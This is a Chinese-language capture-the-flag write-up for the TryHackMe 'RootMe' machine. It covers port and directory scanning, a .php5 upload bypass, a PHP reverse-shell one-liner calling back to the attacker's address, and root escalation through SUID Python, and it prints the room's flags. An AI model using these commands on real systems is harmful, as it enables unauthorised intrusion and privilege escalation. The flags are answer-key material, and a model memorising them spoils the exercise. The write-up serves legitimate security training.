<span style="font-size: 40px; font-weight: bold;">RootMe</span>

<div style="text-align: right;">

date: "2024-01-19"

</div>

# 侦察

1. 扫描机器，有多少端口开放？（2）

```shell
C:\Users\ME\Desktop
# nmap --reason -p- --min-rate 10000 10.10.238.31
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-20 01:03 中国标准时间
Warning: 10.10.238.31 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.238.31
Host is up, received reset ttl 63 (0.31s latency).
Not shown: 65492 closed tcp ports (reset), 41 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Nmap done: 1 IP address (1 host up) scanned in 36.21 seconds
```

2. 正在运行什么版本的Apache ？（2.4.29）

![img](../../images/RootMe_01.png)

3. 端口 22 上正在运行什么服务？（ssh）
4.  隐藏目录是什么？（/panel/）

```shell
┌──(kali㉿kali)-[~/Desktop/dirsearch-0.4.2]
└─$ python3 dirsearch.py -u http://10.10.238.31/       

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/kali/Desktop/dirsearch-0.4.2/reports/10.10.238.31/-_24-01-19_12-07-28.txt

Error Log: /home/kali/Desktop/dirsearch-0.4.2/logs/errors-24-01-19_12-07-28.log

Target: http://10.10.238.31/

[12:07:29] Starting: 
[12:07:31] 301 -  309B  - /js  ->  http://10.10.238.31/js/                 
[12:07:40] 403 -  277B  - /.ht_wsr.txt                                     
[12:07:40] 403 -  277B  - /.htaccess.sample
[12:07:40] 403 -  277B  - /.htaccess.bak1
[12:07:40] 403 -  277B  - /.htaccess.orig
[12:07:40] 403 -  277B  - /.htaccess.save
[12:07:40] 403 -  277B  - /.htaccess_orig
[12:07:40] 403 -  277B  - /.htaccess_extra
[12:07:40] 403 -  277B  - /.htaccessBAK                                    
[12:07:40] 403 -  277B  - /.html
[12:07:40] 403 -  277B  - /.htaccess_sc                                    
[12:07:40] 403 -  277B  - /.htaccessOLD
[12:07:40] 403 -  277B  - /.httr-oauth
[12:07:40] 403 -  277B  - /.htm                                            
[12:07:40] 403 -  277B  - /.htpasswds
[12:07:40] 403 -  277B  - /.htaccessOLD2                                   
[12:07:40] 403 -  277B  - /.htpasswd_test
[12:07:44] 403 -  277B  - /.php                                            
[12:08:32] 301 -  310B  - /css  ->  http://10.10.238.31/css/                
[12:08:43] 200 -  616B  - /index.php                                        
[12:08:43] 200 -  616B  - /index.php/login/                                 
[12:08:44] 200 -  958B  - /js/                                              
[12:08:56] 301 -  312B  - /panel  ->  http://10.10.238.31/panel/            
[12:08:56] 200 -  732B  - /panel/                                           
[12:09:07] 403 -  277B  - /server-status                                    
[12:09:07] 403 -  277B  - /server-status/                                   
[12:09:15] 200 -  743B  - /uploads/                                         
[12:09:15] 301 -  314B  - /uploads  ->  http://10.10.238.31/uploads/        
                                                                             
Task Completed   
```

# shell

1. 找到一个表单上传并获取反向shell（成功）

`/panel/`目录存在文件上传，直接上传后缀`.php5`文件一句话连接，利用PHP反弹shell

```shell
php -r '$sock=fsockopen("10.8.2.147",2333);exec("/bin/sh -i <&3 >&3 2>&3");'
```

2. 搜索有SUID权限的文件，哪个文件比较奇怪？（/usr/bin/python ）

```shell
 nc.exe -lvvp 2333
listening on [any] 2333 ...
10.10.238.31: inverse host lookup failed: h_errno 11004: NO_DATA
connect to [10.8.2.147] from (UNKNOWN) [10.10.238.31] 35704: NO_DATA

find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/bin/mount
/bin/su
/bin/fusermount
/bin/ping
/bin/umount
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

3. root.txt及user.txt中的内容

```plain
连接主机...
连接主机成功
Last login: Tue Aug  4 17:08:53 2020
root@rootme:~# ls
root.txt
root@rootme:~# cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}
root@rootme:~# cat /var/www/user.txt
THM{y0u_g0t_a_sh3ll}
root@rootme:~# 
```

